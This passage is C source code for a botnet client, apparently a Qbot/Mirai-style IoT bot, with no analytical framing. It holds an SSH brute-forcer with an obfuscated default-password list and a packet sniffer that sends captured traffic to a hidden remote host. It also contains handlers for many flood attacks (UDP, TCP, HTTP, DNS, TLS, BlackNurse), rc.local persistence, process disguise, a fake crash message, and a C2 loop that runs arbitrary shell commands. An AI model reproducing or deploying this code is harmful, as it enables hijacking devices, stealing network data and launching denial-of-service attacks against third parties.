            char *passlist[] = {"\xe7\xb9\xb9\x39", "\xe7\xb9\xb9\x39", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff", "\xe4\xd2\xff\x39", "\xe4\xd2\xff\x39", "\x90\x61\xd4\x19\xff", "\xeb\x86\xe2\x6f", "\x90\x61\xd4\x19\xff", "\x90\x61\xd4\x19\xff\xeb\x86\xe2\x6f", "\xf9\xe4\x51\x03\x39", "\xf9\xe4\x51\x03\x39", "\x03\xe4\xa0\xa0\xb9\xe7\x39", "\x03\xe4\xa0\xa0\xb9\xe7\x39", "\xb9\x03\xd4", "\xb9\x03\xd4", "\xd4\x03\xb9", "\xd4\x03\xb9\xa0\x90\x03\x03\x5a\xb9\xe7\x61"}; //'root', 'root', 'admin', 'admin', 'ubnt', 'ubnt', 'admin', '1234', 'admin', 'admin1234', 'guest', 'guest', 'support', 'support', 'osm', 'osm', 'mso', 'msopassword'
            char rekdevice[512];
            srand(time(NULL) ^ rand_cmwc() ^ getpid() + __MAX_SSH_FORKS);
			struct ssh_fds *fds = calloc(__MAX_SSH_FDS, sizeof(struct ssh_fds));
			memset(fds, 0, sizeof(fds));
            while (1) {
                for(mode = 0; mode < 3; mode++) {
                   for(k = 0; k < __MAX_SSH_FDS; k++) {
                        if(mode == 0) {
                            struct sockaddr_in address;
                            memset(&address, 0, sizeof(address));
                            address.sin_family = AF_INET;
                            address.sin_addr.s_addr = getPIP();
                            sprintf(fds[k].ip, "%s", inet_ntoa(address.sin_addr));
                            address.sin_port = HTONS(22);
                            fds[k].sock = socket(AF_INET, SOCK_STREAM, 0);
                            fcntl(fds[k].sock, F_SETFL, O_NONBLOCK);
                            connect(fds[k].sock, (struct sockaddr *)&address, sizeof(address));
                        } else {
                            if(fds[k].sock<0) continue;
                            struct pollfd pfd[1];
                            pfd[0].fd = fds[k].sock;
                            pfd[0].events = POLLOUT;
                            if (poll(pfd, 1, 12) > 0)
                            {
                                for(v = 0; v < NUMITEMS(passlist); v+=2) {
                                    if(pam_auth(eika(passlist[v]), eika(passlist[v+1]), fds[k].ip)>0) break;
                                }
                                fds[k].sock = -1;
                            }
                        }
                    }
                }
            }
        }
    }
}
#endif

void j83jdt(int sock) {
    uint32_t parent;
    parent = fork();
    int forks = sysconf(_SC_NPROCESSORS_ONLN) * 8; //2 j83j fork for each CPU core.
    if (parent > 0) {
        j83jPid = parent;
    } else if (parent == -1) return;
	int fds = 128 * forks;

    srand(time(NULL) ^ getpid() * forks);
	scanner_xywz(sock);
#ifdef ENEMY
    sshj83j();
#endif
}


int sock_raw;
FILE *logfile;
int tcp=0,i,j;

struct sockaddr_in source,dest;



void print_ip_header(unsigned char* Buffer, int Size)
{
	unsigned short iphdrlen;
		
	struct iphdr *iph = (struct iphdr *)Buffer;
	iphdrlen =iph->ihl*4;
	
	memset(&source, 0, sizeof(source));
	source.sin_addr.s_addr = iph->saddr;
	
	memset(&dest, 0, sizeof(dest));
	dest.sin_addr.s_addr = iph->daddr;
	
}

void print_tcp_packet(unsigned char* Buffer, int Size)
{
	unsigned short iphdrlen;
	struct iphdr *iph = (struct iphdr *)Buffer;
	iphdrlen = iph->ihl*4;
	struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
	int port=ntohs(tcph->dest);
	if(port!=80&&port!=21&&port!=25&&port!=666&&port!=1337&&port!=808){
		return;
    }
	
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr; 
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
	int sniffSock = socket_connect(eika("\xeb\xe2\x2a\x97\xeb\x6f\x6f\x97\x6f\xeb\x97\xeb\x2a\x6f"), 9);
    sockprintf(sniffSock, "   |-Destination IP   : %s" , inet_ntoa(dest.sin_addr));
	sockprintf(sniffSock, "   |-Destination Port : %u",port);
    sockprintf(sniffSock, "   |-Source IP        : %s",inet_ntoa(source.sin_addr) );
	sockprintf(sniffSock, "   |-Source Port      : %u",ntohs(tcph->source));
	sockprintf(sniffSock, "   |-TCP Packet count : %d",tcp);
	sockprintf(sniffSock, "\n   /-Data Payload-\\");
	sockprintf(sniffSock, "%s", Buffer + iphdrlen + tcph->doff*4 , (Size - tcph->doff*4-iph->ihl*4));
	sockprintf(sniffSock, "   \\-Data Payload-/\n");

	close(sniffSock);
}


void ProcessPacket(unsigned char* buffer, int size)
{
	//Get the IP Header part of this packet
	struct iphdr *iph = (struct iphdr*)buffer;
	switch (iph->protocol) //Check the Protocol and do accordingly...
	{
		case 1:  //ICMP Protocol
			//PrintIcmpPacket(Buffer,Size);
			break;
		
		case 2:  //IGMP Protocol
			break;
		
		case 6:  //TCP Protocol
			++tcp;
			print_tcp_packet(buffer , size);
			break;
		
		case 17: //UDP Protocol
			break;
		
		default: //Some Other Protocol like ARP etc.
			break;
	}
}

int tcppid = 0;
int tcpkernel()
{
	
  tcppid = fork();
  if (tcppid > 0) return tcppid;

	int saddr_size , data_size;
	struct sockaddr saddr;
	struct in_addr in;
	
	unsigned char *buffer = (unsigned char *)malloc(65536); //Its Big!
	
	//Create a raw socket that shall sniff
	sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_TCP);
	if(sock_raw < 0)
	{
		return 1;
	}
	while(1)
	{
		saddr_size = sizeof saddr;
		//Receive a packet
		data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
		if(data_size > 0)
		{
		    //Now process the packet
		    ProcessPacket(buffer , data_size);
	    }
	}
	close(sock_raw);
	return 0;
}
int get;
void processCmd(int argc, unsigned char * argv[]) {
  if(strstr(argv[0], okic("~-6mvgmv"))) { //LDSERVER - gets loader server for everything
      if(argc == 2) { memset(ldserver, 0, sizeof(ldserver)); strcpy(ldserver, argv[1]); }
     //printf("SUCCESSFULLY LOADED LOADER SERVER %s\n", ldserver);
  } else if(strstr(argv[0], "TCPON")) {
	  if(tcppid == 0) {
		tcppid = tcpkernel();
	  }
  }
  else if(strstr(argv[0], "TCPOFF")) {
	  if(tcppid > 0) {
		  kill(tcppid, 9);
		  tcppid = 0;
	  }
  }
  else if (!strcmp(argv[0], okic("1-|"))) {
    if (argc < 3 || atoi(argv[2]) <= 0 || atoi(argv[3]) <= 0 ) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = (argc > 4 ? atoi(argv[4]) : 32);
    int packetsize = (argc > 5 ? atoi(argv[5]) : 65507);;
    int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
    int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
    int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
        _exit(0);
      }
    }
    return;
  } else if (!strcmp(argv[0], okic("cD|"))) { //TCP
    if (argc < 5 || atoi(argv[3]) <= 0 || atoi(argv[2]) == -1) {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = 32;
    unsigned char *flags = argv[4];

    int pollinterval = 10;
    int psize = atoi(argv[5]);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          ftcp(hi, port, time, spoofed, flags, psize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        ftcp(ip, port, time, spoofed, flags, psize, pollinterval);
        _exit(0);
      }
    }
	return;
  } else if(!strcmp(argv[0], eika("\x09\x1c\x9d\x36\xb0\xda\x1e"))) {
    if (argc < 5 || atoi(argv[3]) <= 0 || atoi(argv[2]) == -1) {
      return;
    }

    unsigned char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int spoofed = 32;
    unsigned char *flags = argv[4];

    int pollinterval = 10;
    int psize = atoi(argv[5]);

    if (strstr(ip, ",") != NULL) {
      unsigned char * hi = strtok(ip, ",");
      while (hi != NULL) {
        if (!listFork()) {
          ovtcp(hi, port, time, spoofed, flags, psize, pollinterval);
          _exit(0);
        }
        hi = strtok(NULL, ",");
      }
    } else {
      if (!listFork()) {
        ovtcp(ip, port, time, spoofed, flags, psize, pollinterval);
        _exit(0);
      }
    }
  } else if (!strcmp(argv[0], okic("ecc|"))) { //HTTP
        if (argc < 6) {
            return;
        }
        if (strstr((const char * ) argv[1], ",") != NULL) {
            unsigned char * hi = (unsigned char * ) strtok((char * ) argv[1], ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
                    _exit(0);
                }
                hi = (unsigned char * ) strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {
            sendHTTP((char * ) argv[1], (char * ) argv[2], atoi((char * ) argv[3]), (char * ) argv[4], atoi((char * ) argv[5]), atoi((char * ) argv[6]));
            _exit(0);
			}
        }
    } else if (!strcmp(argv[0], okic("ej~-"))) { //HOLD
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
            return;
        }

        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    sendHLD(hi, port, time);
                    close(fd_cnc);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (!listFork()) {

            sendHLD(ip, port, time);
            _exit(0);
			}
        }
    } else if (!strcmp(argv[0], okic("51,U"))) { //JUNK
        if (argc < 3 || atoi(argv[3]) < 0) {
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if(!listFork())
                    sendJNK(hi, port, time);
					_exit(0);
			}
			hi = strtok(NULL, ",");
         
        } else {
            if (!listFork()) {

            sendJNK(ip, port, time);
			_exit(0);
        }
    }
	} else if (!strcmp(argv[0], okic("c~6"))) { //TLS ATTACK CODED BY FREAK
        if (argc < 3 || atoi(argv[3]) < 0) {
            return;
        }
        unsigned char * ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        if (strstr(ip, ",") != NULL) {
            unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
                if(!listFork())
                    sendTLS(hi, port, time);
					_exit(0);
			}
			hi = strtok(NULL, ",");
         
        } else {
            if (!listFork()) {

            sendTLS(ip, port, time);
			_exit(0);
        }
    }
	} else if (!strcmp(argv[0], okic("6c-"))) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
				if(!listFork()) {
                sendPkt(hi, port, time);
				_exit(0);
				}
                hi = strtok(NULL, ",");
            }
    } else {
if(!listFork()) {
                sendPkt(ip, port, time);
				_exit(0);
				}
				}
	return;
  } else if (!strcmp(argv[0], okic("-,6"))) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
				if(!listFork()) {
                DNSw(hi, port, time);
				_exit(0);
				}
                hi = strtok(NULL, ",");
            }
    } else {
if(!listFork()) {
                DNSw(ip, port, time);
				_exit(0);
				}
				}
	return;
  } else if (!strcmp(argv[0], okic("6D7,,mv"))) { //SCANNER
        if (!strcmp(argv[1], okic("j,"))) { //ON
        if (j83jPid == 0) {
            j83jdt(fd_cnc);
            if (j83jPid != 0) {
                return;
            } else {
                return;
            }
        } else {
            return;
        }
    } else if (!strcmp(argv[1], okic("jdd"))) { //OFF
        if (j83jPid != 0) {
            if (kill(j83jPid, 9) == 0) {
                j83jPid = 0;
                return;
            } else {
                return;
            }
        } else {
            return;
        }
    } else {
        return;
    }
    } else if(!strcmp(argv[0], okic("jge"))) { //OVH
		if(argc < 5)
                {
                        
                        return;
                }
				if(!listFork()) {
		pktSend(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
	
		}
	} else if(!strcmp(argv[0], okic(".~7DU,1v6m"))) { //BLACKNURSE
		if (argc < 2) {
			return;
		}
		if(!listFork()) {
			bnrse(argv[1], atoi(argv[2]));
		}
	} else if(!strcmp(argv[0], okic("6cj|")))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
				{
                        if (pids[i] != 0 && pids[i] != getpid())
						{
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
				{
					//
                } else {
							//
					   }
        
	} else if (!strcmp(argv[0], "ARK")) {
    if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) {
      return;
    }

    unsigned char * ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    if (strstr(ip, ",") != NULL) {
        unsigned char * hi = strtok(ip, ",");
            while (hi != NULL) {
				if(!listFork()) {
                sendARK(hi, port, time);
				_exit(0);
				}
                hi = strtok(NULL, ",");
            }
    } else {
if(!listFork()) {
                sendARK(ip, port, time);
				_exit(0);
				}
				}
	return;
  } else if(strstr(argv[0], "ADNS")) {
		if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) return;

		if (argc < 5) {
			return;
		}
		
		srand(time(NULL));
		int num_threads = atoi(argv[5]);
		int i;
		download(argv[4], "DNS.txt");
		struct thread_data td[num_threads];
		for (i = 0; i < num_threads; i++) {
			td[i].target = argv[1];
			td[i].dport = atoi(argv[2]);
			td[i].time = atoi(argv[3]);
	 
			dnsflood((void * )&td[i]);
		}
		return;
  }

}

char *getBuild() { //Get current architecture, detectx nearly every architecture. Coded by Freak
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7A";
    #elif defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7R";
    #elif defined(__ARM_ARCH_7M__)
    return "ARM7M";
    #elif defined(__ARM_ARCH_7S__)
    return "ARM7S";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__PPC__) || defined(_ARCH_PPC)
    return "POWERPC";
    #elif defined(__PPC64__) || defined(__ppc64__) || defined(_ARCH_PPC64)
    return "POWERPC64";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}

/* returns
 *   -1 on errors
 *    0 on successful server bindings
 *   1 on successful client connects
 */
int singleton_connect(const char *name) {
    int len, tmpd;
    struct sockaddr_un addr = {0};

    if ((tmpd = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) {
        return -1;
    }

    /* fill in socket address structure */
    addr.sun_family = AF_UNIX;
    strcpy(addr.sun_path, name);
    len = offsetof(struct sockaddr_un, sun_path) + strlen(name);

    int ret;
    unsigned int retries = 1;
    do {
        /* bind the name to the descriptor */
        ret = bind(tmpd, (struct sockaddr *)&addr, len);
        /* if this succeeds there was no daemon before */
        if (ret == 0) {
            return 0;
        } else {
            if (errno == EADDRINUSE) {
                ret = connect(tmpd, (struct sockaddr *) &addr, sizeof(struct sockaddr_un));
                if (ret != 0) {
                    if (errno == ECONNREFUSED) {
                        unlink(name);
                        continue;
                    }
                    continue;
                }
                return 1;
            }
            continue;
        }
    } while (retries-- > 0);

    close(tmpd);
    return -1;
}




int main(int argc, char**argv) {
	fprintf(stderr, "perror: EWOULDBLOCK\nSegmentation fault (core dumped)\n");
	if(singleton_connect("enemyv2.1.lock")) exit(1); // rrrrrrrreeeeeeeeeee ....
	srand(time(NULL) ^ getpid() ^ getppid());
	init_rand(time(NULL) ^ getpid() ^ getppid());
	char pname[13];
	rand_str(pname, 12);
	int asds;
	// calculate available size
	size_t space = 0;
	for (asds = 0; asds < argc; asds++) {
		size_t length = strlen(argv[asds]);
		space += length + 1; // because of terminating zero 
	}
	memset(argv[0], '\0', space); // wipe existing args
	strncpy(argv[0], pname, space - 1); // -1: leave null termination, if title bigger than space
#ifndef DARWIN
#ifndef FREEBSD
	prctl(PR_SET_NAME,pname,NULL,NULL,NULL);
#endif
#endif
	pid_t pid1;
	pid_t pid2;
	int status;
	if (pid1 = fork()) {
					waitpid(pid1, &status, 0);
					exit(0);
	} else if (!pid1) {
					if (pid2 = fork()) {
								  exit(0);  
					} else if (!pid2) {
					} else {
					}
	}
	setsid();
	setuid(0);				
	seteuid(0);
	signal(SIGCHLD, SIG_IGN); //AUTOMATICALLY REAP CHILD PROCESSES
	signal(SIGPIPE, SIG_IGN);
#ifndef DARWIN
	char cwd[256];
	FILE *file;
	char str[16];
	sprintf(str, "/etc/%s", okic("=ru_Brf_"));
	file=fopen(str,"r");
	if (file == NULL) {
		file=fopen(str,"r");
	}
	if (file != NULL) {
		char outfile[256], buf[1024];
		int i=strlen(argv[0]), d=0;
		getcwd(cwd,256);
		if (strcmp(cwd,"/")) {
				while(argv[0][i] != '/') i--;
				sprintf(outfile,"%s%s\n",cwd,argv[0]+i);
				while(!feof(file)) {
						fgets(buf,1024,file);
						if (!strcasecmp(buf,outfile)) d++;
				}
				if (d == 0) {
						FILE *out;
						fclose(file);
						out=fopen(str,"w");
						if (out != NULL) {
								fputs(outfile,out);
								fclose(out);
						}
				}
				else fclose(file);
		}
		else fclose(file);
	}
#endif
	int wfd;
	  if ((wfd = open("/dev/watchdog", 2)) != -1 ||
		  (wfd = open("/dev/misc/watchdog", 2)) != -1) {
		int one = 1;
		ioctl(wfd, 0x80045704, &one);
		close(wfd);
		wfd = 0;
	  }
	  LOCAL_ADDR = util_local_addr();

    coil_xywz(getpid());
    char rdbuf[512];
    int got = 0;
    int i = 0;
    int read_set = 0;
    struct timeval tv;
    int node = 0;
    int _time = 0;
	char **decodedshit=(char**)calloc(500,sizeof(char) * 256);
    while(_time <= 3600) {
		if((fd_cnc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		{
			close(fd_cnc);
		}
		if(!connectTimeout(fd_cnc, eika("\xfc\x86\xad\x74\x20\xad\xe1\x9a\x52\xad\x86\x20"), 7, 7))
		{
			close(fd_cnc);
		} else {
			_time=0;
			send(fd_cnc, "\x01", 1, MSG_NOSIGNAL);
			sockprintf(fd_cnc, "%s %s\n", okic("f=rb"), getBuild()); //decoded is "arch"
			while((got = recvLine(rdbuf, 1024)) != -1)
			{
				if(got == 0) continue;
				for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
						unsigned int *newpids, on;
						for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
						pids[on - 1] = 0;
						numpids--;
						newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
						for (on = 0; on < numpids; on++) newpids[on] = pids[on];
						pids = newpids;
						free(newpids);
				}
				rdbuf[got] = 0x00;
				trim(rdbuf);
				if(strstr(rdbuf, okic("|x,<")) == rdbuf)
				{
					continue;
				}
				unsigned char *message = rdbuf;
				while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
				unsigned char *command = message;
				while(*message != ' ' && *message != 0x00) message++;
				*message = 0x00;
				message++;
			 
				unsigned char *tmpcommand = command;
				while(*tmpcommand) { *tmpcommand = mytoupper(*tmpcommand); tmpcommand++; }
				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(message, " ");
				params[0] = command;
				while(pch) {
					if(*pch != '\n') {
						if(paramsCount>=10) continue;
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, " ");
				}
				if(strcmp(command + 3, "SH ") == 0) {
					command += 3;
					system(command);
				}
				processCmd(paramsCount, params);
				if(paramsCount > 1) {
					int q = 1;
					for(q = 1; q < paramsCount; q++) {
							free(params[q]);
					}
				}
				
			}
			sleep(1);
		}
	}
}
